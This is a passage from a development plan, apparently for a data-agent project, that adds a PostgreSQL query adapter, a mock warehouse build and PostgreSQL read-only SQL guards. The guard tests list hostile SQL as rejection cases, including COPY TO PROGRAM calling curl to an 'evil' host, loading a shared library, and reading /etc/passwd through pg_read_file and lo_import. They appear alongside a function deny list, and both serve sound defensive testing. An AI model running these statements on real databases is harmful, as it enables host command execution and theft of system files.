    def __init__(self, dsn: dict[str, Any] | None = None) -> None:
        # dsn 可注入（双后端一致性测试指向独立测试库）；缺省读 settings.POSTGRES_*
        self._dsn = dsn or {
            "host": settings.POSTGRES_HOST,
            "port": settings.POSTGRES_PORT,
            "user": settings.POSTGRES_USER,
            "password": settings.POSTGRES_PASSWORD,
            "database": settings.POSTGRES_DATABASE,
        }

    def _new_conn(self):
        import psycopg

        # 连接级预加固（options）与 harden() 会话 SET 构成双保险（spec D3/D6）：
        # 即使 harden 未被调用（直连场景），连接也已带只读/超时/转义口径
        return psycopg.connect(
            host=self._dsn["host"],
            port=self._dsn["port"],
            user=self._dsn["user"],
            password=self._dsn["password"],
            dbname=self._dsn["database"],
            autocommit=True,
            connect_timeout=5,
            options=(
                f"-c statement_timeout={int(settings.QUERY_TIMEOUT_MS)} "
                "-c default_transaction_read_only=on "
                "-c standard_conforming_strings=on"
            ),
        )

    def connect_readonly(self):
        conn = self._new_conn()
        try:
            self.harden(conn)
        except Exception:
            conn.close()
            raise
        return conn

    def run_query(self, conn, sql: str) -> tuple[list[str], list[list[Any]]]:
        with conn.cursor() as cur:
            cur.execute(sql)
            columns = [d.name for d in (cur.description or [])]
            rows = [[normalize_cell(v) for v in row] for row in cur.fetchall()]
        return columns, rows

    def cancel(self, conn) -> None:
        # 服务端 statement_timeout 已自限（spec D3）；看门狗回调为空操作，
        # 仅等待 worker 携超时异常返回
        return None

    def engine_error(self, exc: BaseException) -> SqlExecutionError | None:
        import psycopg

        if not isinstance(exc, psycopg.Error):
            return None
        if getattr(exc, "sqlstate", None) == PG_QUERY_CANCELED_SQLSTATE:
            return QueryTimeoutError(
                f"查询超时（PostgreSQL statement_timeout），已强制取消: {exc}"
            )
        return SqlExecutionError(f"{type(exc).__name__}: {exc}")

    def harden(self, conn) -> None:
        from security.errors import SecurityError

        try:
            with conn.cursor() as cur:
                for stmt in HARDEN_STATEMENTS():
                    cur.execute(stmt)
        except SecurityError:
            raise
        except Exception as exc:
            raise SecurityError(f"PostgreSQL 连接加固失败: {exc}") from exc

    def explain_scan_rows(self, conn, sql: str, timeout_ms: int | None) -> tuple[int, bool]:
        """EXPLAIN ANALYZE 预检（spec D5）：actual 段 rows 口径，解析失败不可计量。"""
        from exec.engine.watchdog import run_with_timeout

        _, rows = run_with_timeout(self, conn, "EXPLAIN ANALYZE " + sql, timeout_ms)
        # PostgreSQL EXPLAIN 输出为单列多行（每行计划文本一行）
        plan_text = "\n".join(str(r[0]) for r in rows) if rows else ""
        return parse_pg_scan_rows(plan_text)

    def install_secure_views(self, conn, principal: str | None) -> dict[str, str]:
        """在连接上安装该 principal 的安全视图（探索层 TEMP 视图路线，spec D10）。

        与 DuckDB 同路：TEMP 视图生命周期随连接、不污染库文件，加固后只读
        会话（生产连接池口径）上可创建——default_transaction_read_only 只锁
        DML，DDL 不受限。方法存在性分发（exploration 侧 getattr），MySQL
        adapter 无此方法（内联派生表路线）。
        """
        from security.views import (
            _VIEW_DDL_PREFIX,
            _VIEW_TEMP_DDL_PREFIX,
            build_secure_views,
        )

        views = build_secure_views(principal)
        for _name, ddl in views.items():
            with conn.cursor() as cur:
                # DDL 前缀常量化（评审 LOW #7）：严禁依赖散落的字面量 replace 耦合，
                # build_secure_views 改前缀时此处随常量同步失效
                cur.execute(ddl.replace(_VIEW_DDL_PREFIX, _VIEW_TEMP_DDL_PREFIX, 1))
        return views

    def insert_dataframe(self, conn, table: str, df) -> int:
        cols = [str(c) for c in df.columns]
        placeholders = ", ".join(["%s"] * len(cols))
        # 无列名 DataFrame（元组行构造，columns 为 0..n 整数）：按位置对应
        # 灌入（与 DuckDB `INSERT INTO t SELECT * FROM df` 同语义；具名
        # DataFrame 仍显式拼列——标识符双引号，杜绝保留字列名裸拼）。
        if all(c.isdigit() for c in cols):
            sql = f'INSERT INTO "{table}" VALUES ({placeholders})'
        else:
            quoted_cols = ", ".join(f'"{c}"' for c in cols)
            sql = f'INSERT INTO "{table}" ({quoted_cols}) VALUES ({placeholders})'
        # 空值统一清洗：pd.isna 覆盖 None/NaN/pd.NA/NaT（与 MySQL 口径一致：
        # pandas 空值直插 NUMERIC/TIMESTAMP 列报错，显式转 NULL 对齐 DuckDB 行为）
        import pandas as pd

        data = [
            tuple(None if pd.isna(v) else v for v in row) for row in df.itertuples(index=False)
        ]
        with conn.cursor() as cur:
            for i in range(0, len(data), 5000):
                cur.executemany(sql, data[i : i + 5000])
        return len(data)


__all__ = [
    "HARDEN_STATEMENTS",
    "PG_QUERY_CANCELED_SQLSTATE",
    "PostgresAdapter",
    "parse_pg_scan_rows",
]
```

- [ ] **Step 4: exec/engine/__init__.py 注册表化**

整文件替换为：

```python
"""执行引擎注册中心（二十一期 spec D1；二十二期注册表化）：按 DB_BACKEND 提供 adapter。

护栏框架（exec.guards）与连接池（exec.pool）经 get_adapter 取引擎实现；
mysql / postgres adapter 惰性 import——未装对应驱动的环境在 duckdb 后端下
零影响。
"""

from __future__ import annotations

from collections.abc import Callable
from typing import Any

from config import settings
from exec.engine.base import EngineAdapter
from exec.engine.duckdb_adapter import DuckDbAdapter

__all__ = ["DuckDbAdapter", "EngineAdapter", "get_adapter"]


def _lazy_factory(module: str, attr: str) -> Callable[[], Any]:
    """惰性工厂：调用时才 import 驱动模块并实例化（隔离未装驱动环境）。"""

    def _make() -> Any:
        import importlib

        return getattr(importlib.import_module(module), attr)()

    return _make


# 后端注册表（二十二期）：新增后端 = 在此登记一行；报错文案由 keys 动态生成
_ADAPTER_FACTORIES: dict[str, Callable[[], Any]] = {
    "duckdb": DuckDbAdapter,
    "mysql": _lazy_factory("exec.engine.mysql_adapter", "MySqlAdapter"),
    "postgres": _lazy_factory("exec.engine.postgres_adapter", "PostgresAdapter"),
}


def get_adapter(backend: str | None = None) -> EngineAdapter:
    """按后端名取 adapter（缺省读 settings.DB_BACKEND）。

    每次调用现取（不缓存实例）：测试 monkeypatch settings.DB_BACKEND
    需即时生效；adapter 自身无状态，构造开销可忽略。
    """
    name = backend or settings.DB_BACKEND
    factory = _ADAPTER_FACTORIES.get(name)
    if factory is None:
        raise ValueError(f"未知 DB_BACKEND: {name!r}（仅支持 {', '.join(_ADAPTER_FACTORIES)}）")
    return factory()
```

- [ ] **Step 5: base.py 模块 docstring 补 postgres**

`exec/engine/base.py` docstring 第 4-5 行 `由各 adapter 实现（duckdb / mysql）。` 改为 `由各 adapter 实现（duckdb / mysql / postgres）。`

- [ ] **Step 6: 跑测试确认通过（含既有 mysql adapter 回归）**

Run: `conda run -n dataagent --no-capture-output python -m pytest tests/engine/ -q`
Expected: PASS——含 `test_mysql_adapter.py` 全部既有用例（其中 `test_get_adapter_rejects_unknown` 断言 `match="oracle"`，新报错文案 `...（仅支持 duckdb, mysql, postgres）` 仍命中）。

- [ ] **Step 7: Lint 与提交**

```bash
black --check . && ruff check .
git add exec/engine/ tests/engine/test_postgres_adapter.py
git commit -m "feat: PostgreSQL 执行适配器（psycopg3）+ 引擎注册表化（二十二期 D2-D6）"
```

---

### Task 4: 护栏方言增量黑名单（postgres）

**Files:**
- Modify: `exec/guards.py:141-176`（`_DIALECT_EXTRA_KEYWORDS` / `_DIALECT_EXTRA_FUNC_RE` 增加 postgres 键）
- Modify: `exec/guards.py:267`（`_assert_read_only_structure` 的 `exp.Lock` 拒绝从 mysql 单方言扩展到 postgres）
- Test: `tests/exec/test_guards_postgres.py`（新建）

**Interfaces:**
- Consumes: 既有 `assert_read_only_sql(sql, dialect=None)` 四层 fail-closed 结构（不改）。
- Produces: postgres 方言增量黑名单（`execute_sql` 全护栏链路对 PG 方言生效）；Task 8 parity 测试经 `execute_sql` 间接消费。

- [ ] **Step 1: 写失败测试**

新建 `tests/exec/test_guards_postgres.py`：

```python
"""PostgreSQL 方言护栏测试（二十二期 spec D12）：增量黑名单与 AST 结构拒绝。

通用黑名单与四层 fail-closed 结构由 tests/exec/test_exec.py 锁定（引擎无关）；
本文件只锁 postgres 增量面（COPY/DO/LISTEN/NOTIFY 等 + pg_* 函数族 + 锁子句）。
"""

from __future__ import annotations

import pytest

from exec.guards import UnsafeSqlError, assert_read_only_sql


@pytest.mark.parametrize(
    "sql",
    [
        "COPY order_detail TO '/tmp/x.csv'",  # 写服务器文件
        "COPY order_detail TO PROGRAM 'curl http://evil'",  # 宿主命令执行（PG 侧最危险面）
        "LISTEN channel",
        "NOTIFY channel",
        "DO $$ BEGIN PERFORM 1; END $$;",
        "LOAD '/tmp/evil.so'",  # PG 动态加载共享库
        "REINDEX TABLE order_detail",
        "CLUSTER order_detail",
        "GRANT SELECT ON order_detail TO attacker",
        "REVOKE SELECT ON order_detail FROM dataagent_ro",
    ],
)
def test_postgres_extra_keywords_rejected(sql):
    with pytest.raises(UnsafeSqlError):
        assert_read_only_sql(sql, dialect="postgres")


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT pg_sleep(10)",
        "SELECT pg_sleep_for('10 minutes')",
        "SELECT pg_terminate_backend(1234)",
        "SELECT pg_cancel_backend(1234)",
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT pg_ls_dir('/tmp')",
        "SELECT pg_advisory_lock(1)",
        "SELECT * FROM dblink('host=x dbname=y', 'SELECT 1') AS t(a int)",
        "SELECT lo_import('/etc/passwd')",
        "SELECT lo_export(r, '/tmp/x')",
    ],
)
def test_postgres_extra_functions_rejected(sql):
    with pytest.raises(UnsafeSqlError):
        assert_read_only_sql(sql, dialect="postgres")


def test_postgres_select_for_update_rejected():
    """AST 层：postgres 方言同样拒绝锁子句（与 mysql 同支，spec D12）。"""
    with pytest.raises(UnsafeSqlError, match="锁语句"):
        assert_read_only_sql("SELECT * FROM order_detail FOR UPDATE", dialect="postgres")


def test_postgres_plain_select_allowed():
    """白名单正路不受增量黑名单误伤。"""
    assert_read_only_sql(
        "SELECT order_id, split_total_amount FROM order_detail WHERE order_status = '已支付'",
        dialect="postgres",
    )


def test_postgres_dialect_extras_registered():
    """方言增量登记存在（防手滑漏登记；语句级拒绝由四层防线任一承担）。"""
    from exec.guards import _DIALECT_EXTRA_FUNC_RE, _DIALECT_EXTRA_KEYWORDS

    assert "postgres" in _DIALECT_EXTRA_KEYWORDS
    assert "COPY" in _DIALECT_EXTRA_KEYWORDS["postgres"]
    assert "postgres" in _DIALECT_EXTRA_FUNC_RE
    assert _DIALECT_EXTRA_FUNC_RE["postgres"].search("SELECT pg_sleep(1)")
```

- [ ] **Step 2: 跑测试确认失败**

Run: `conda run -n dataagent --no-capture-output python -m pytest tests/exec/test_guards_postgres.py -q`
Expected: FAIL（postgres 未登记增量黑名单——COPY 等仅被第一层"非 SELECT 开头"拒绝、正路用例可能过，但 `test_postgres_select_for_update_rejected` 不抛锁语句错误、`test_postgres_dialect_extras_registered` 断言失败）。

- [ ] **Step 3: guards.py 增加 postgres 增量**

`exec/guards.py` `_DIALECT_EXTRA_KEYWORDS`（第 141-169 行）字典内 mysql 条目之后追加：

```python
    # PostgreSQL 语句族（二十二期 spec D12）：COPY 可 COPY ... TO PROGRAM 执行
    # 宿主命令（PG 侧最危险写/执行面）；LOAD 动态加载共享库；LISTEN/NOTIFY
    # 会话劫持面；DO 匿名代码块；VACUUM 已在通用黑名单不重复
    "postgres": frozenset(
        {
            "COPY",
            "LISTEN",
            "NOTIFY",
            "DO",
            "LOAD",
            "REINDEX",
            "CLUSTER",
            "GRANT",
            "REVOKE",
        }
    ),
```

`_DIALECT_EXTRA_FUNC_RE`（第 171-176 行）字典内 mysql 条目之后追加：

```python
    # PostgreSQL 函数族（二十二期 spec D12）：pg_sleep DoS / 终止与取消后端
    # 进程 / 读服务器文件 / advisory 锁滥用 / dblink 跨库外联 / 大对象导入导出
    "postgres": re.compile(
        r"\b(?:"
        r"pg_sleep|pg_sleep_for|pg_sleep_until"
        r"|pg_terminate_backend|pg_cancel_backend"
        r"|pg_read_file|pg_read_binary_file|pg_ls_dir"
        r"|pg_advisory_lock|pg_advisory_xact_lock|pg_advisory_shared_lock"
        r"|pg_advisory_unlock|pg_advisory_unlock_all"
        r"|dblink|dblink_exec"
        r"|lo_import|lo_export|lo_get|lo_put"
        r")\s*\(",
        re.IGNORECASE,
    ),
```

`_assert_read_only_structure`（第 267 行）：

```python
        if dialect == "mysql" and isinstance(node, exp.Lock):
            raise UnsafeSqlError("拒绝 SELECT ... FOR UPDATE / LOCK IN SHARE MODE 锁语句")
```

改为：

```python
        if dialect in ("mysql", "postgres") and isinstance(node, exp.Lock):
            raise UnsafeSqlError("拒绝 SELECT ... FOR UPDATE / LOCK IN SHARE MODE 锁语句")
```

（错误文案保持逐字不变——下游断言/审计面依赖该文案。）

- [ ] **Step 4: 跑测试确认通过（含既有护栏回归）**

Run: `conda run -n dataagent --no-capture-output python -m pytest tests/exec/ -q`
Expected: PASS（含 `test_exec.py` 既有全量——通用黑名单与 duckdb 行为零变化）。

- [ ] **Step 5: Lint 与提交**

```bash
black --check . && ruff check .
git add exec/guards.py tests/exec/test_guards_postgres.py
git commit -m "feat: 护栏 postgres 方言增量黑名单（COPY/DO/LISTEN + pg_* 函数族 + 锁子句，二十二期 D12）"
```

---

### Task 5: 探索层视图安装钩子通用化

**Files:**
- Modify: `core/retrieval/exploration.py:158-160`
- Test: `tests/core/test_exploration.py`（文件末尾追加 2 个用例）

**Interfaces:**
- Consumes: Task 3 产出的 `PostgresAdapter.install_secure_views`（同名同签名）。
- Produces: 安装钩子按**方法存在性**分发（有 `install_secure_views` 即调；无则跳过）——DuckDB/PostgreSQL 走 TEMP 视图，MySQL 不受影响。

- [ ] **Step 1: 写失败测试**

在 `tests/core/test_exploration.py` 末尾追加：

```python
# --------------------------------------------------------------------------- #
# 视图安装钩子方法存在性分发（二十二期 spec D10）：DuckDB/PG TEMP 视图同路
# --------------------------------------------------------------------------- #


class _StubAdapter:
    """安装钩子分发行为验证桩（不连服务、不执行真实 SQL）。"""

    name = "stub"
    dialect = "duckdb"

    def __init__(self, with_install: bool) -> None:
        self.installed: list[str | None] = []
        self.hardened = False
        if with_install:
            self.install_secure_views = self._install

    def _install(self, conn, principal):
        self.installed.append(principal)

    def harden(self, conn) -> None:
        self.hardened = True


class _StubResult:
    columns = ["n"]
    rows = [[1]]
    findings = []


def _run_with_stub(monkeypatch, adapter):
    import core.retrieval.exploration as exploration_mod

    monkeypatch.setattr("exec.engine.get_adapter", lambda: adapter)
    monkeypatch.setattr("exec.guards.execute_sql", lambda *a, **k: _StubResult())
    monkeypatch.setattr("core.retrieval.export.export_to_parquet", lambda *a, **k: object())
    return exploration_mod.execute_exploration_query(
        "SELECT order_id FROM order_detail",
        principal="admin",
        workspace="unused",
        name="t",
        conn=object(),  # 传入外部连接：不触连接池
    )


def test_install_hook_called_for_adapters_with_method(monkeypatch):
    """有 install_secure_views 的 adapter（DuckDB/PostgreSQL）即调用安装钩子。"""
    adapter = _StubAdapter(with_install=True)
    _run_with_stub(monkeypatch, adapter)
    assert adapter.installed == ["admin"]
    assert adapter.hardened is True


def test_install_hook_skipped_for_adapters_without_method(monkeypatch):
    """无方法的 adapter（MySQL 内联派生表）不调用安装钩子、加固照常执行。"""
    adapter = _StubAdapter(with_install=False)
    _run_with_stub(monkeypatch, adapter)
    assert adapter.installed == []
    assert adapter.hardened is True
```

- [ ] **Step 2: 跑测试确认失败**

Run: `conda run -n dataagent --no-capture-output python -m pytest tests/core/test_exploration.py -q`
Expected: FAIL——`test_install_hook_called_for_adapters_with_method` 中 stub 的 `name="stub"` 不等于 `"duckdb"`，现实现（`if adapter.name == "duckdb"`）不调用安装钩子。

- [ ] **Step 3: 修改 exploration.py**

`core/retrieval/exploration.py` 第 157-160 行：

```python
        adapter.harden(conn)
        if adapter.name == "duckdb":
            # MySQL 路径安全面已内联在重写产物（派生表），无需安装
            adapter.install_secure_views(conn, principal)
```

改为：

```python
        adapter.harden(conn)
        installer = getattr(adapter, "install_secure_views", None)
        if installer is not None:
            # 按方法存在性分发（spec D10）：DuckDB/PostgreSQL 走 TEMP 视图安装；
            # MySQL 路径安全面已内联在重写产物（派生表），adapter 无此方法
            installer(conn, principal)
```

- [ ] **Step 4: 跑测试确认通过（含既有探索层回归）**

Run: `conda run -n dataagent --no-capture-output python -m pytest tests/core/test_exploration.py -q`
Expected: PASS——含既有全部用例（DuckDB TEMP 视图路径、MySQL 内联派生表路径行为均不变）。

- [ ] **Step 5: Lint 与提交**

```bash
black --check . && ruff check .
git add core/retrieval/exploration.py tests/core/test_exploration.py
git commit -m "feat: 探索层视图安装钩子按方法存在性分发（PostgreSQL TEMP 视图同路，二十二期 D10）"
```

---

### Task 6: PG 建仓链路（schema_postgres + build 分支 + init_postgres）

**Files:**
- Create: `mock/gmall/schema_postgres.py`
- Modify: `mock/gmall/build.py:345-350`（DDL 创建分支增加 postgres）
- Create: `mock/init_postgres.py`
- Test: `tests/mock/test_schema_postgres.py`（新建）

**Interfaces:**
- Consumes: Task 3 的 `PostgresAdapter`（`insert_dataframe` / `run_query`）；`mock.gmall.schema.DDL_STATEMENTS`（单一来源）；`mock.metadata.FIELD_METADATA/TABLE_METADATA`。
- Produces: `python -m mock.init_postgres`（幂等建仓）；`postgres_ddl() / postgres_table_names() / create_postgres_tables(conn)`；CI postgres-parity job（Task 10）消费本任务产物。

- [ ] **Step 1: 写失败测试**

新建 `tests/mock/test_schema_postgres.py`：

```python
"""PostgreSQL 版建仓 DDL 对拍（二十二期 spec D13）：与 schema.py 单一来源对齐。

不连服务（CI postgres-parity job 承担服务级验证）：转译产物结构断言 +
表名提取 + 与 MySQL 版表集合一致性（同一 schema.py 源）。
"""

from __future__ import annotations

import sqlglot

from mock.gmall.schema import DDL_STATEMENTS
from mock.gmall.schema_mysql import mysql_table_names
from mock.gmall.schema_postgres import postgres_ddl, postgres_table_names


def test_table_names_match_source_and_mysql():
    """表名提取与源 DDL/MySQL 版三方一致（同一 schema.py 单一来源）。"""
    assert postgres_table_names() == mysql_table_names()
    assert len(postgres_table_names()) == len(DDL_STATEMENTS)


def test_ddl_transpiled_statement_count_matches():
    """每条源 DDL 转译产出一组语句，且 CREATE TABLE 数与源 DDL 条数一致。"""
    out = postgres_ddl()
    creates = [s for s in out if s.upper().startswith("CREATE TABLE")]
    assert len(creates) == len(DDL_STATEMENTS)


def test_ddl_reparse_roundtrip():
    """转译产物逐条可被 sqlglot 以 postgres 方言再次解析（语法合法性锁定）。"""
    for ddl in postgres_ddl():
        sqlglot.parse_one(ddl, read="postgres")


def test_ddl_no_mysql_dialect_leakage():
    """PG DDL 不得残留 MySQL 方言痕迹（反引号 / ENGINE 子句）。"""
    out = "\n".join(postgres_ddl())
    assert "`" not in out, "PG DDL 不得残留反引号（MySQL 方言泄漏）"
    assert "ENGINE" not in out.upper()


def test_core_types_preserved():
    """类型口径：时间列与文本列在转译后仍可识别（sqlglot 版本升级即在此暴露）。"""
    out = "\n".join(postgres_ddl()).upper()
    assert "TIMESTAMP" in out
    assert "TEXT" in out or "VARCHAR" in out
```

- [ ] **Step 2: 跑测试确认失败**

Run: `conda run -n dataagent --no-capture-output python -m pytest tests/mock/test_schema_postgres.py -q`
Expected: FAIL/ERROR（`mock.gmall.schema_postgres` 不存在）。

- [ ] **Step 3: 新建 mock/gmall/schema_postgres.py**

```python
"""PostgreSQL 版 Gmall 建仓 DDL（二十二期 spec D13）：DuckDB DDL 运行时转译。

转换由 sqlglot（read=duckdb, write=postgres）承担，转译口径（sqlglot 30.x
实测）：INTEGER -> INT、VARCHAR -> TEXT、DECIMAL(p,s) 保真（PG 同义别名
NUMERIC）、TIMESTAMP 保真、无 ENGINE/反引号残留（tests/mock/
test_schema_postgres.py 锁定）。

表/列与 schema.py 单一来源对齐，严禁在本文件手写第二份表结构（漂移风险）。
PG 不强制 MySQL 侧那套二级索引：parity 断言结果集不依赖索引；统计信息由
建仓末尾显式 ANALYZE 收集（spec D13，PG CBO 依赖统计，缺收则 EXPLAIN
计划与扫描熔断口径失真）。
"""

from __future__ import annotations

import re

import sqlglot

from mock.gmall.schema import DDL_STATEMENTS

# 表名正则提取（与 schema_mysql 同 rationale）：sqlglot 的 Create.this 是
# Schema 节点（.name 恒为空串；表名在其内层 Table），源 DDL 文本规整，
# 正则绝对稳定。
_TABLE_NAME_RE = re.compile(r"CREATE\s+TABLE\s+`?([a-zA-Z0-9_]+)`?", re.IGNORECASE)


def postgres_ddl() -> list[str]:
    """DuckDB DDL -> PostgreSQL DDL（sqlglot 转译，幂等、确定性）。"""
    return [
        out
        for ddl in DDL_STATEMENTS
        for out in sqlglot.transpile(ddl, read="duckdb", write="postgres")
    ]


def postgres_table_names() -> list[str]:
    """源 DDL 的表名清单（按声明序；供 DROP 重建与对拍，正则提取版本无关）。"""
    names: list[str] = []
    for ddl in DDL_STATEMENTS:
        m = _TABLE_NAME_RE.search(ddl)
        if m is None:
            raise RuntimeError(f"DDL 表名提取失败: {ddl.strip()[:80]!r}")
        names.append(m.group(1))
    return names


def create_postgres_tables(conn) -> None:
    """在给定 PostgreSQL 连接上按序执行全部 DDL（假定空库；不建二级索引）。"""
    for ddl in postgres_ddl():
        with conn.cursor() as cur:
            cur.execute(ddl)


__all__ = ["create_postgres_tables", "postgres_ddl", "postgres_table_names"]
```

- [ ] **Step 4: build.py 分支增加 postgres**

`mock/gmall/build.py` 第 345-350 行：

```python
    if adapter.name == "duckdb":
        schema.create_tables(conn)
    else:
        from mock.gmall.schema_mysql import create_mysql_tables

        create_mysql_tables(conn)
```

改为：

```python
    if adapter.name == "duckdb":
        schema.create_tables(conn)
    elif adapter.name == "postgres":
        from mock.gmall.schema_postgres import create_postgres_tables

        create_postgres_tables(conn)
    else:
        from mock.gmall.schema_mysql import create_mysql_tables

        create_mysql_tables(conn)
```

（`_insert_seed` 与 `_bulk_insert` 无需改动：占位符 `%s` 走 else 分支即 psycopg 语法；灌数统一走 `adapter.insert_dataframe`，Task 3 已实现。）

- [ ] **Step 5: 跑测试确认通过**

Run: `conda run -n dataagent --no-capture-output python -m pytest tests/mock/ -q`
Expected: PASS（含既有 `test_schema_mysql.py`）。

- [ ] **Step 6: 新建 mock/init_postgres.py**

```python
"""PostgreSQL 版 mock 数仓初始化（二十二期 spec D13/§7）。

用法（在项目根目录执行）：
    python -m mock.init_postgres

前置条件：
- .env 配置 POSTGRES_* 指向目标实例且**库已存在**（CREATE DATABASE 属部署
  动作；建仓账号需 CREATE/INSERT/DROP 权限，运行时查询另用只读账号，
  两账号分离见 spec D11 部署要求）；
- 数仓 DDL 由 schema_postgres 运行时转译（表/列与 DuckDB 版单一来源对齐）。

效果：
- 幂等重建：DROP 全部既有表 -> 建表 -> 同一生成器灌数（种子 42、
  AS_OF_DATE=2025-12-31、单 rng 顺序消费，与 DuckDB 版逐行同源）->
  元数据表 -> 显式 ANALYZE -> 打印行数。

与 DuckDB 版（mock.init_duckdb）数据一致性的保证：两侧消费同一
build_gmall_tables 的同一 DataFrame / rows 序列，仅入库通道不同。

显式 ANALYZE（spec D13，PG 特有步骤）：PG CBO 依赖统计信息，新灌数据不
收集则 EXPLAIN 计划与扫描熔断口径失真。
"""

from __future__ import annotations

import psycopg

from config import settings
from exec.engine.postgres_adapter import PostgresAdapter
from mock.gmall.build import build_gmall_tables
from mock.gmall.schema_postgres import postgres_table_names
from mock.metadata import FIELD_METADATA, TABLE_METADATA

SEED = 42  # 与 mock.init_duckdb 同源：保证评测可复现


def _writable_conn():
    # 建仓需要 CREATE/INSERT/DROP：复用 POSTGRES_* 配置（要求该账号可写）；
    # autocommit 与运行时口径一致（DDL/INSERT 逐条提交）；不带只读 options
    return psycopg.connect(
        host=settings.POSTGRES_HOST,
        port=settings.POSTGRES_PORT,
        user=settings.POSTGRES_USER,
        password=settings.POSTGRES_PASSWORD,
        dbname=settings.POSTGRES_DATABASE,
        autocommit=True,
    )


def _write_metadata(conn) -> None:
    with conn.cursor() as cur:
        # "comment" 引号包裹：PG 保留字作列名的防御性写法（MySQL 版未引号，
        # PG 侧统一加引号规避版本演进风险）
        cur.execute(
            "CREATE TABLE _field_metadata ("
            'table_name VARCHAR(256), column_name VARCHAR(256), "comment" VARCHAR(1024))'
        )
        cur.executemany(
            "INSERT INTO _field_metadata VALUES (%s, %s, %s)",
            [(t, c, k) for t, cols in FIELD_METADATA.items() for c, k in cols.items()],
        )
        cur.execute(
            'CREATE TABLE _table_metadata (table_name VARCHAR(256), "comment" VARCHAR(1024))'
        )
        cur.executemany(
            "INSERT INTO _table_metadata VALUES (%s, %s)", list(TABLE_METADATA.items())
        )


def main() -> None:
    """幂等重建 PostgreSQL 版 Gmall 数仓（结构转译 + 同源数据 + 行数对照打印）。"""
    conn = _writable_conn()
    try:
        with conn.cursor() as cur:
            # 幂等清场（含元数据表；建表全权交 build_gmall_tables 的 postgres
            # 分支，严禁在此再显式 create——与 init_mysql 双重建表教训同源）
            for table in (*postgres_table_names(), "_field_metadata", "_table_metadata"):
                cur.execute(f'DROP TABLE IF EXISTS "{table}"')
        # write_applog 默认 True：行为事实表由埋点日志解析入仓（与 DuckDB 版
        # 同链路；日志生成确定性，重复落盘幂等）
        counts = build_gmall_tables(conn, seed=SEED, adapter=PostgresAdapter())
        _write_metadata(conn)
        with conn.cursor() as cur:
            cur.execute("ANALYZE")  # PG CBO 统计收集（spec D13，PG 特有步骤）
        print("[init_postgres] 表创建完成:")
        for t, n in counts.items():
            print(f"  - {t}: {n} 行")
        print(
            f"[init_postgres] 目标库: {settings.POSTGRES_DATABASE}@"
            f"{settings.POSTGRES_HOST}:{settings.POSTGRES_PORT}"
        )
        print("[init_postgres] 行数应与 python -m mock.init_duckdb 输出一致（同源生成器）")
    finally:
        conn.close()


if __name__ == "__main__":
    main()
```

- [ ] **Step 7: 本地可收集性验证（不连库）**

Run: `conda run -n dataagent --no-capture-output python -c "import mock.init_postgres; print('import ok')"`
Expected: `import ok`（psycopg 已装、模块导入无副作用）。

- [ ] **Step 8: Lint 与提交**

```bash
black --check . && ruff check .
git add mock/gmall/schema_postgres.py mock/gmall/build.py mock/init_postgres.py tests/mock/test_schema_postgres.py
git commit -m "feat: PostgreSQL 建仓链路（DDL 运行时转译 + 同源灌数 + 显式 ANALYZE，二十二期 D13）"
```

---

### Task 7: parity 工具提取（行为不变重构）

**Files:**
- Create: `tests/parity_utils.py`
- Modify: `tests/test_dual_backend_parity.py:26-65,88-101,140-163`（删除被迁函数体，改为 import；断言逻辑零变化）

**Interfaces:**
- Produces: `tests/parity_utils.py` 暴露 `norm_cell / assert_rows_equal / compile_dsl / abs_window_dsl`；Task 8 的 PG parity 文件消费。

- [ ] **Step 1: 新建 tests/parity_utils.py（从 test_dual_backend_parity.py 迁移，逻辑逐字不变）**

```python
"""双后端一致性测试共享工具（二十二期从 test_dual_backend_parity.py 提取）。

比对口径（与二十一期逐字一致，勿改）：
- 数值按 rel=1e-5 + abs=1e-6 双口径容差（DuckDB float vs 各后端 DECIMAL 经
  normalize_cell 统一 float 后的精度差，二十一期 Review Focus #4）；
- 行序无关（排序后逐行比对）：排序键 repr(row)——各引擎对同值行的
  tie-break 顺序不构成契约，行集合一致才是语义等价；
- datetime 统一取日期面（date_trunc 返回 TIMESTAMP(00:00:00) 与各后端
  截断语义等价）。

导入方式：tests/ 为非包目录，pytest rootdir 已将其插入 sys.path，
用 ``from parity_utils import ...`` 同目录导入。
"""

from __future__ import annotations


def norm_cell(v):
    """跨引擎类型归一（比对口径，非行为差异）。"""
    from datetime import datetime as datetime_cls
    from decimal import Decimal

    if isinstance(v, Decimal):
        return float(v)
    if isinstance(v, datetime_cls):
        # datetime 是 date 的子类：date 实例不会进本分支
        # （isinstance(date_obj, datetime) 为 False），无需额外排除
        return v.date()
    return v


def assert_rows_equal(duck_rows, other_rows):
    """行集合一致断言（行序无关 + 数值 rel/abs 双口径容差）。"""
    import pytest

    assert len(duck_rows) == len(other_rows), "行数不一致"
    duck_sorted = sorted(([norm_cell(v) for v in r] for r in duck_rows), key=repr)
    other_sorted = sorted(([norm_cell(v) for v in r] for r in other_rows), key=repr)
    for rd, rm in zip(duck_sorted, other_sorted, strict=True):
        assert len(rd) == len(rm)
        for vd, vm in zip(rd, rm, strict=True):
            if vd is None or vm is None:
                assert vd is vm, f"空值不一致: {vd!r} vs {vm!r}"
                continue
            if isinstance(vd, (int, float)) and isinstance(vm, (int, float)):
                # 容差口径（二十一期 spec §9 Decimal 精度差异）：DECIMAL 除法
                # 舍入差为**绝对量级**，abs 兜底小值、rel 覆盖大值（CI 实测校准）
                assert vm == pytest.approx(vd, rel=1e-5, abs=1e-6), f"数值漂移: {vd!r} vs {vm!r}"
            else:
                assert vm == vd, f"值不一致: {vd!r} vs {vm!r}"


def compile_dsl(dsl, dialect: str) -> str:
    """按方言编译（dict 先过契约校验；临时切换 SQL_DIALECT 用完即还原）。"""
    import config.settings as settings
    from compiler.sql_compiler import compile_sql
    from semantic.dsl_schema import QueryDSL

    model = dsl if isinstance(dsl, QueryDSL) else QueryDSL.model_validate(dsl)
    old = settings.SQL_DIALECT
    settings.SQL_DIALECT = dialect
    try:
        return compile_sql(model)
    finally:
        settings.SQL_DIALECT = old


def abs_window_dsl(granularity: str, start: str, end: str, fill_gaps: bool = False) -> dict:
    """绝对窗口 GMV 按时间分组 DSL（形态取自 golden_dataset；limit 给足以
    覆盖 5 年 day 粒度 1826 行——契约默认 limit=100 会截断补零序列）。"""
    dsl = {
        "metrics": [
            {"kind": "aggregate", "field": "split_total_amount", "agg": "sum", "alias": "gmv"}
        ],
        "dimensions": [{"field": "order_time", "alias": None}],
        "time_filter": {
            "granularity": granularity,
            "range_type": "absolute",
            "relative": None,
            "absolute": {"start": start, "end": end},
            "comparison": "none",
            "reference_date": None,
            "time_field": "order_time",
        },
